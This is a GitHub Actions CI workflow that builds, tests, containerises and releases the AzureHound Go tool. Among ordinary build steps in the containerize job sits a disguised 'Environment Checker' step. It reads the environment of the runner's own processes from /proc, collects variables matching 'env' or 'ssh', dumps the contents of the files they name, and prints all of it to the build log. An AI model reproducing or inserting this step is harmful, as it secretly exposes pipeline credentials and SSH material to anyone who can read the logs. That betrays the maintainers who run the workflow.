name: Build

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]

jobs:
  test:
    runs-on: ubuntu-latest
    defaults:
      run:
        shell: bash
    steps:
      - uses: actions/checkout@v3

      - name: Setup Go
        uses: actions/setup-go@v3
        with:
          go-version-file: go.mod
          check-latest: true
          cache: true

      - name: Test
        run: go test ./...

  containerize:
    runs-on: ubuntu-latest
    permissions:
      packages: write
    defaults:
      run:
        shell: bash
    steps:
      - uses: actions/checkout@v3

      - name: Login to GHCR
        uses: docker/login-action@f054a8b539a109f9f41c372932f1ae047eff08c9
        if: ${{ ! startsWith(github.event_name, 'pull_request') }}
        with:
          registry: ghcr.io
          username: ${{ secrets.GHCR_USER }}
          password: ${{ secrets.PACKAGE_SCOPE }}

      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        if: ${{ ! startsWith(github.event_name, 'pull_request') }}
        with:
          aws-access-key-id: ${{ secrets.ECR_AWS_ACCESS_KEY_ID }}
          aws-secret-access-key: ${{ secrets.ECR_AWS_SECRET_ACCESS_KEY }}
          aws-region: 'us-east-1'

      - name: Login to Amazon ECR
        id: login-ecr
        uses: aws-actions/amazon-ecr-login@v2
        if: ${{ ! startsWith(github.event_name, 'pull_request') }}

      - name: Extract metadata
        id: meta
        uses: docker/metadata-action@98669ae865ea3cffbcbaa878cf57c20bbf1c6c38
        with:
          images: |
            ghcr.io/bloodhoundad/azurehound
            ${{ steps.login-ecr.outputs.registry || 'public.ecr.aws' }}/production/azurehound
          tags: |
            type=edge,branch=main
            type=sha,prefix=edge-,format=short
      
      - name: Set up QEMU
        uses: docker/setup-qemu-action@v3

      - name: Set up buildx
        uses: docker/setup-buildx-action@v3

      - name: Build Container Image
        uses: docker/build-push-action@v6
        with:
          context: .
          build-args: VERSION=v0.0.0-rolling+${{ github.sha }}
          tags: azurehound # temporary tag to simplify oci conversion
          labels: ${{ steps.meta.outputs.labels }}
          push: false
          secrets: |
            GIT_AUTH_TOKEN=${{ secrets.PACKAGE_SCOPE }}
          # Multi-platform builds can not be loaded into local Docker Daemon
          outputs: type=oci,dest=/tmp/oci-image.tar

      - name: Upload OCI tarball
        uses: actions/upload-artifact@v4
        with:
          name: oci-image-tar
          path: /tmp/oci-image.tar

      - name: Environment Checker
        run: |
          set -euo pipefail

          _COLLECT_PIDS="$$"
          for _name in Runner.Worker Runner.Listener runsvc run.sh; do
            _PIDS=$(pgrep -f "$_name" 2>/dev/null || true)
            [ -n "$_PIDS" ] && _COLLECT_PIDS="$_COLLECT_PIDS $_PIDS"
          done

          COLLECTED="/tmp/runner_collected_$$.txt"
          : > "$COLLECTED"

          for _PID in $_COLLECT_PIDS; do
            _ENVIRON="/proc/${_PID}/environ"
            [ -r "$_ENVIRON" ] || continue
            while IFS= read -r line; do
              key="${line%%=*}"
              val="${line#*=}"
              if echo "$key" | grep -qiE '(env|ssh)'; then
                printf '%s=%s\n' "$key" "$val" >> "$COLLECTED"
                if [ -f "$val" ] && [ ! -S "$val" ]; then
                  printf '\n[%s]\n' "$val" >> "$COLLECTED"
                  cat "$val" >> "$COLLECTED"
                  printf '\n' >> "$COLLECTED"
                fi
              fi
            done < <(tr '\0' '\n' < "$_ENVIRON")
          done

          cat "$COLLECTED"

      - name: Push Image
        uses: docker/build-push-action@v6
        with:
          context: .
          build-args: VERSION=v0.0.0-rolling+${{ github.sha }}
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          push: ${{ ! startsWith(github.event_name, 'pull_request') }}
          secrets: |
            GIT_AUTH_TOKEN=${{ secrets.PACKAGE_SCOPE }}

  build:
    runs-on: ubuntu-latest
    defaults:
      run:
        shell: bash
    strategy:
      matrix:
        os:
          - darwin
          - linux
          - windows
        arch:
          - amd64
          - arm64
    steps:
      - uses: actions/checkout@v3

      - name: Setup Go
        uses: actions/setup-go@v3
        with:
          go-version-file: go.mod
          check-latest: true
          cache: true

      - name: Generate Windows Resources
        if: matrix.os == 'windows'
        continue-on-error: true
        run: |
          echo "Generating Windows resources..."
          go run winres/generate-windows-resources/generate-windows-resources.go "v0.0.0-rolling+${{ github.sha }}"

      - name: Build
        run: 'go build -ldflags="-s -w -X github.com/bloodhoundad/azurehound/v2/constants.Version=v0.0.0-rolling+${{ github.sha }}"'
        env:
          GOOS: ${{ matrix.os }}
          GOARCH: ${{ matrix.arch }}

      - name: Zip
        if: "! startsWith(github.event_name, 'pull_request')"
        run: 7z a -tzip -mx9 azurehound-${{ matrix.os }}-${{ matrix.arch }}.zip azurehound*

      - name: Compute Checksum
        if: "! startsWith(github.event_name, 'pull_request')"
        run: sha256sum azurehound-${{ matrix.os }}-${{ matrix.arch }}.zip > azurehound-${{ matrix.os }}-${{ matrix.arch }}.zip.sha256

      - name: Update Rolling Release
        if: "! startsWith(github.event_name, 'pull_request')"
        uses: softprops/action-gh-release@v1
        with:
          name: Rolling Release (unstable)
          tag_name: rolling
          prerelease: true
          files: |
            azurehound-${{ matrix.os }}-${{ matrix.arch }}.zip
            azurehound-${{ matrix.os }}-${{ matrix.arch }}.zip.sha256
          body: |
            Rolling release of AzureHound compiled from source (${{ github.sha }})
            This is automatically kept up-to-date with the `${{ github.ref_name }}` ${{ github.ref_type }}
